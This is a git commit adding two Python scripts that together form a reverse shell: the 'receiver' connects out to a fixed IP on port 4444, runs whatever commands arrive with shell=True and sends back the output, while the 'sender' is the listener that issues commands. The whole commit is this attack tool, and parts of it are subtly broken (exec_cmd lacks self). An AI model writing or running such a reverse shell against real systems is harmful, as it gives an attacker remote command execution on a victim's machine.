3fb8d4d1caaa9f15cb5447e026b44b80018ad6fc
singhfalak <75836454+singhfalak@users.noreply.github.com>
2022-01-16 19:27:44 +0530

    Add files via upload

---
+++ sock_cmd_reciever.py
@@ -0,0 +1,30 @@
+from socket import SOCK_STREAM, socket
+import socket
+import subprocess
+
+class Connect:
+    def __init__(self, ip, port ):
+        self.ip = ip
+        self.port = port
+        self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        self.connection.connect((self.ip, self.port))
+
+    def send(self, command):
+        self.connection.send(command)
+    def recieve(self):
+        return self.connection.recv(1024)
+
+    def exec_cmd(command):
+        return subprocess.check_output(command, shell=True)
+    
+    def execute(self):
+        while True:
+            cmd = self.recieve()
+            cmd_result = self.exec_cmd(cmd)
+            self.send(cmd_result)
+        self.connection.close()
+        
+        
+
+con = Connect("192.168.124.134", 4444)
+con.execute()
---
+++ sock_cmd_sender.py
@@ -0,0 +1,27 @@
+import socket
+
+class Listener:
+    def __init__(self, ip, port):
+        self.ip = ip
+        self.port = port
+        self.listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        self.listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+        self.listener.bind((self.ip, self.port))
+        self.listener.listen(0)                                      
+        print("[+]Waiting for Connection")
+        self.connection, address = self.listener.accept()
+        print("[+]Connection Established with " + str(address))
+
+    def snr(self, command):
+        self.connection.send(command)
+        return self.connection.recv(1024)
+
+    def execute(self):
+        while True:
+            cmd = raw_input(">> ")
+            result = self.snr(cmd)
+            print(result)
+
+
+listener = Listener("192.168.124.1", 4444)
+listener.execute()
